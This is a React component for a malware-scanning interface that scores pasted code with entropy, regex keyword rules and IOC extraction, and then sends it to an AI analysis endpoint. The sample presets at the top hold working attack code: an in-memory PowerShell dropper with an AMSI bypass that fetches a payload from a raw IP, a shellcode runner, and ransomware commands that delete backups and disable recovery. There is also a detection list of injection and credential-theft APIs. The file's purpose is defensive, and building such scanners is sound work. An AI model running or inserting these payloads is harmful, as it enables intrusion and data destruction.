import React, { useState } from 'react';
import { 
  Terminal, 
  Sparkles, 
  AlertTriangle, 
  CheckCircle2, 
  FileCode, 
  Binary, 
  Cpu, 
  ShieldAlert, 
  Zap, 
  Copy, 
  Check, 
  Trash2 
} from 'lucide-react';
import { AIAnalysisResult } from '../types';

const SAMPLE_PAYLOAD_PRESETS = [
  {
    name: 'PowerShell In-Memory Dropper (AMSI Patch + IEX)',
    code: `$url = "http://185.244.150.84/stage2.bin"
# Patch AMSI in memory
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")
$bytes = $wc.DownloadData($url)
[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, $null)`
  },
  {
    name: 'C++ Process Injection Shellcode Runner',
    code: `#include <windows.h>

int main() {
    unsigned char shellcode[] = "\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51";
    SIZE_T size = sizeof(shellcode);
    
    // Allocate executable memory page
    LPVOID pMem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(pMem, shellcode, size);
    
    // Execute shellcode in background thread
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMem, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}`
  },
  {
    name: 'Ransomware VSS & Backup Eraser Script',
    code: `cmd.exe /c "vssadmin.exe Delete Shadows /All /Quiet"
cmd.exe /c "wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0"
cmd.exe /c "bcdedit /set {default} recoveryenabled No"
cmd.exe /c "bcdedit /set {default} bootstatuspolicy ignoreallfailures"
powershell.exe -Command "Get-Service -Name '*sql*' | Stop-Service -Force"`
  },
  {
    name: 'Benign Clean Python Utility',
    code: `import os
import json
from datetime import datetime

def generate_report(filename="log.txt"):
    data = {
        "status": "success",
        "timestamp": datetime.now().isoformat(),
        "files_processed": 42
    }
    with open(filename, "w") as f:
        json.dump(data, f, indent=4)
    print("Report generated successfully.")

if __name__ == "__main__":
    generate_report()`
  }
];

export const CustomAnalyzer: React.FC = () => {
  const [code, setCode] = useState<string>(SAMPLE_PAYLOAD_PRESETS[0].code);
  const [isAnalyzing, setIsAnalyzing] = useState<boolean>(false);
  const [aiResult, setAiResult] = useState<AIAnalysisResult | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [copied, setCopied] = useState<boolean>(false);

  // Client-side heuristics
  const calculateEntropy = (str: string): number => {
    if (!str) return 0;
    const freqs: Record<string, number> = {};
    for (let i = 0; i < str.length; i++) {
      const char = str[i];
      freqs[char] = (freqs[char] || 0) + 1;
    }
    let entropy = 0;
    const len = str.length;
    for (const char in freqs) {
      const p = freqs[char] / len;
      entropy -= p * Math.log2(p);
    }
    return Number(entropy.toFixed(3));
  };

  const entropy = calculateEntropy(code);

  // Simple regex heuristics
  const dangerousKeywords = [
    { pattern: /VirtualAlloc/i, name: 'VirtualAlloc (Memory Allocation)', category: 'INJECTION', weight: 20 },
    { pattern: /WriteProcessMemory/i, name: 'WriteProcessMemory (Process Tampering)', category: 'INJECTION', weight: 25 },
    { pattern: /CreateRemoteThread/i, name: 'CreateRemoteThread (Code Injection)', category: 'INJECTION', weight: 30 },
    { pattern: /AmsiUtils|amsiInitFailed|AmsiScanBuffer/i, name: 'AMSI Bypass Token', category: 'EVASION', weight: 30 },
    { pattern: /vssadmin.*Delete\s+Shadows/i, name: 'Shadow Copy Deletion', category: 'RANSOMWARE', weight: 35 },
    { pattern: /bcdedit.*recoveryenabled\s+No/i, name: 'Disable Recovery Mode', category: 'RANSOMWARE', weight: 25 },
    { pattern: /WH_KEYBOARD_LL|SetWindowsHookEx/i, name: 'Keyboard Hook (Keylogger)', category: 'SPYWARE', weight: 25 },
    { pattern: /DownloadData|DownloadString|DownloadFile/i, name: 'WebClient Payload Retrieval', category: 'C2_DOWNLOAD', weight: 15 },
    { pattern: /PAGE_EXECUTE_READWRITE/i, name: 'RWX Memory Permissions', category: 'INJECTION', weight: 20 },
    { pattern: /CryptUnprotectData/i, name: 'DPAPI Browser Password Decryption', category: 'CREDENTIAL_STEALER', weight: 30 }
  ];

  const matchedKeywords = dangerousKeywords.filter(k => k.pattern.test(code));
  
  // Extract IPs, URLs
  const ipRegex = /\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/g;
  const urlRegex = /https?:\/\/[^\s"'`<>]+/g;
  const extractedIps = Array.from(new Set(code.match(ipRegex) || []));
  const extractedUrls = Array.from(new Set(code.match(urlRegex) || []));

  const rawScore = matchedKeywords.reduce((acc, curr) => acc + curr.weight, 0) + (entropy > 6.8 ? 20 : 0) + (extractedIps.length > 0 ? 10 : 0);
  const heuristicScore = Math.min(100, rawScore);

  const handleRunAnalysis = async () => {
    setIsAnalyzing(true);
    setError(null);
    try {
      const response = await fetch('/api/analyze-malware', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sampleName: 'Custom User Payload / Code Snippet',
          sampleType: matchedKeywords.length > 0 ? matchedKeywords[0].category : 'Unknown Artifact',
          content: code,
          staticIndicators: matchedKeywords.map(m => m.name),
          dynamicBehaviors: [
            ...extractedIps.map(ip => `Outbound IP Reference: ${ip}`),
            ...extractedUrls.map(u => `Outbound URL Reference: ${u}`)
          ]
        })
      });

      const data = await response.json();
      if (data.success && data.analysis) {
        setAiResult(data.analysis);
      } else {
        setError(data.error || 'Failed to analyze custom code');
      }
    } catch (err: any) {
      setError(err.message || 'Failed to communicate with analysis server');
    } finally {
      setIsAnalyzing(false);
    }
  };

  const handleCopyCode = () => {
    navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="space-y-6 pb-12">
      {/* Header & Presets */}
      <div className="rounded-2xl bg-slate-900 border border-slate-800 p-6 space-y-4">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
          <div>
            <div className="flex items-center gap-2">
              <Terminal className="w-5 h-5 text-cyan-400" />
              <h2 className="text-xl font-bold text-slate-100">
                Custom Artifact & Script Threat Scanner
              </h2>
            </div>
            <p className="text-xs sm:text-sm text-slate-400 mt-0.5">
              Paste any PowerShell, Python, C/C++, Bash, or disassembled payload to evaluate entropy, extract IOCs, and trigger Gemini AI threat reverse-engineering.
            </p>
          </div>

          <button
            id="analyze-custom-code-btn"
            onClick={handleRunAnalysis}
            disabled={isAnalyzing || !code.trim()}
            className="flex items-center justify-center gap-2 px-5 py-2.5 rounded-xl bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white text-xs font-bold shadow-md shadow-cyan-950/40 transition disabled:opacity-50"
          >
            {isAnalyzing ? (
              <>
                <span className="w-3.5 h-3.5 border-2 border-white border-t-transparent rounded-full animate-spin"></span>
                <span>Inspecting Payload & IOCs...</span>
              </>
            ) : (
              <>
                <Sparkles className="w-4 h-4" />
                <span>Analyze with Gemini 3.7 AI</span>
              </>
            )}
          </button>
        </div>

        {/* Preset Selector */}
        <div className="space-y-1.5 pt-2 border-t border-slate-800/80">
          <label className="text-[11px] font-mono uppercase text-slate-400 font-bold">
            Load Quick Test Payloads:
          </label>
          <div className="flex flex-wrap gap-2">
            {SAMPLE_PAYLOAD_PRESETS.map((preset, idx) => (
              <button
                key={idx}
                onClick={() => {
                  setCode(preset.code);
                  setAiResult(null);
                }}
                className="px-3 py-1 rounded-lg text-xs bg-slate-950 border border-slate-800 text-slate-300 hover:border-cyan-500/50 hover:text-cyan-300 transition"
              >
                {preset.name}
              </button>
            ))}
          </div>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Editor Area */}
        <div className="lg:col-span-2 space-y-3">
          <div className="flex items-center justify-between">
            <label className="text-xs font-mono font-bold text-slate-400">
              Payload / Script Code Editor:
            </label>
            <div className="flex items-center gap-2">
              <button
                onClick={handleCopyCode}
                className="flex items-center gap-1 text-[11px] px-2 py-1 rounded bg-slate-800 text-slate-300 hover:bg-slate-700 transition"
              >
                {copied ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                <span>{copied ? 'Copied' : 'Copy'}</span>
              </button>
              <button
                onClick={() => setCode('')}
                className="flex items-center gap-1 text-[11px] px-2 py-1 rounded bg-slate-800 text-slate-300 hover:bg-slate-700 transition"
              >
                <Trash2 className="w-3 h-3" />
                <span>Clear</span>
              </button>
            </div>
          </div>

          <textarea
            id="custom-code-editor"
            value={code}
            onChange={(e) => setCode(e.target.value)}
            rows={16}
            placeholder="Paste code or script here..."
            className="w-full rounded-xl bg-slate-950 border border-slate-800 p-4 font-mono text-xs text-slate-200 focus:outline-none focus:border-cyan-500 leading-relaxed transition"
          />
        </div>

        {/* Real-time Heuristic Assessment Card */}
        <div className="space-y-4">
          <div className="rounded-2xl bg-slate-900 border border-slate-800 p-5 space-y-4">
            <h3 className="text-sm font-bold text-slate-100 flex items-center gap-2">
              <Cpu className="w-4 h-4 text-cyan-400" />
              Live Heuristic Evaluation
            </h3>

            <div>
              <span className="text-[11px] font-mono text-slate-400 block mb-1">Heuristic Threat Score:</span>
              <div className="flex items-baseline gap-2">
                <span className={`text-3xl font-extrabold font-mono ${
                  heuristicScore > 70 ? 'text-rose-400' : heuristicScore > 30 ? 'text-amber-400' : 'text-emerald-400'
                }`}>
                  {heuristicScore}%
                </span>
                <span className="text-xs font-mono text-slate-400">
                  {heuristicScore > 70 ? 'High Risk' : heuristicScore > 30 ? 'Suspicious' : 'Clean / Low Risk'}
                </span>
              </div>
            </div>

            <div className="pt-2 border-t border-slate-800 space-y-1">
              <span className="text-xs font-mono text-slate-400">Shannon Entropy:</span>
              <div className="flex items-center justify-between text-xs font-mono">
                <span className={`font-bold ${entropy > 7.0 ? 'text-rose-400' : 'text-slate-200'}`}>
                  {entropy} / 8.0
                </span>
                <span className="text-[10px] text-slate-500">
                  {entropy > 7.0 ? 'Obfuscated' : 'Normal Text'}
                </span>
              </div>
            </div>

            {/* Matched Dangerous Tokens */}
            <div className="pt-2 border-t border-slate-800 space-y-2">
              <span className="text-xs font-mono font-bold text-slate-400 block">
                Suspicious API & Keyword Hits ({matchedKeywords.length}):
              </span>
              {matchedKeywords.length === 0 ? (
                <p className="text-xs text-slate-500 italic">No high-risk keywords detected in static scan.</p>
              ) : (
                <div className="space-y-1.5">
                  {matchedKeywords.map((k, i) => (
                    <div key={i} className="p-2 rounded bg-slate-950 border border-slate-800 text-[11px] font-mono flex items-center justify-between">
                      <span className="text-amber-300">{k.name}</span>
                      <span className="text-[10px] px-1.5 py-0.5 rounded bg-slate-800 text-slate-400">{k.category}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>

            {/* Extracted IOCs */}
            {(extractedIps.length > 0 || extractedUrls.length > 0) && (
              <div className="pt-2 border-t border-slate-800 space-y-2">
                <span className="text-xs font-mono font-bold text-slate-400 block">
                  Extracted Network IOCs:
                </span>
                <div className="space-y-1 font-mono text-[11px]">
                  {extractedIps.map((ip, i) => (
                    <div key={i} className="text-rose-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 truncate">
                      IP: {ip}
                    </div>
                  ))}
                  {extractedUrls.map((url, i) => (
                    <div key={i} className="text-cyan-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 truncate">
                      URL: {url}
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        </div>
      </div>

      {/* AI Analysis Results View */}
      {error && (
        <div className="p-4 rounded-xl bg-rose-950/80 border border-rose-800 text-rose-300 text-xs flex items-center gap-2">
          <AlertTriangle className="w-4 h-4 shrink-0" />
          <span>{error}</span>
        </div>
      )}

      {aiResult && (
        <div className="rounded-2xl bg-gradient-to-br from-indigo-950/40 via-slate-900 to-slate-950 border border-indigo-700/50 p-6 space-y-5">
          <div className="flex items-center justify-between border-b border-indigo-900/50 pb-3">
            <div className="flex items-center gap-2">
              <Sparkles className="w-5 h-5 text-indigo-400" />
              <h3 className="text-base font-bold text-slate-100">
                Gemini Threat Intelligence Assessment
              </h3>
            </div>
            <span className="px-2.5 py-1 rounded-full text-xs font-mono font-bold bg-indigo-900/80 border border-indigo-700/60 text-indigo-200">
              Verdict: {aiResult.threatVerdict}
            </span>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
            <div className="p-3 bg-slate-950 rounded-xl border border-slate-800">
              <span className="text-[10px] font-mono text-slate-500 uppercase">Confidence</span>
              <p className="text-sm font-bold text-cyan-300">{aiResult.confidenceScore}%</p>
            </div>
            <div className="p-3 bg-slate-950 rounded-xl border border-slate-800">
              <span className="text-[10px] font-mono text-slate-500 uppercase">Malware Family</span>
              <p className="text-sm font-bold text-rose-400 truncate">{aiResult.familyClassification}</p>
            </div>
            <div className="p-3 bg-slate-950 rounded-xl border border-slate-800">
              <span className="text-[10px] font-mono text-slate-500 uppercase">CVSS Severity</span>
              <p className="text-sm font-bold text-amber-400">{aiResult.cvssScore} / 10.0</p>
            </div>
          </div>

          <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
            <h5 className="text-xs font-mono font-bold uppercase text-indigo-300">Analysis Summary</h5>
            <p className="text-xs text-slate-200 leading-relaxed">{aiResult.summary}</p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
              <h5 className="text-xs font-mono font-bold uppercase text-amber-400">Attack Vectors & Evasion</h5>
              <ul className="space-y-1 text-xs text-slate-300">
                {aiResult.evasionTechniquesDetected.map((tech, i) => (
                  <li key={i} className="flex items-start gap-2">
                    <span className="text-amber-400">•</span>
                    <span>{tech}</span>
                  </li>
                ))}
              </ul>
            </div>

            <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
              <h5 className="text-xs font-mono font-bold uppercase text-emerald-400">Recommended Remediation</h5>
              <ul className="space-y-1 text-xs text-slate-300">
                {aiResult.remediationSteps.map((step, i) => (
                  <li key={i} className="flex items-start gap-2">
                    <span className="text-emerald-400 font-bold">✓</span>
                    <span>{step}</span>
                  </li>
                ))}
              </ul>
            </div>
          </div>

          {aiResult.deobfuscatedInsight && (
            <div className="p-4 rounded-xl bg-indigo-950/40 border border-indigo-800/50 text-xs text-indigo-200">
              <strong className="block font-mono text-indigo-300 mb-1">Deobfuscation & Reverse Engineering Insight:</strong>
              {aiResult.deobfuscatedInsight}
            </div>
          )}
        </div>
      )}
    </div>
  );
};
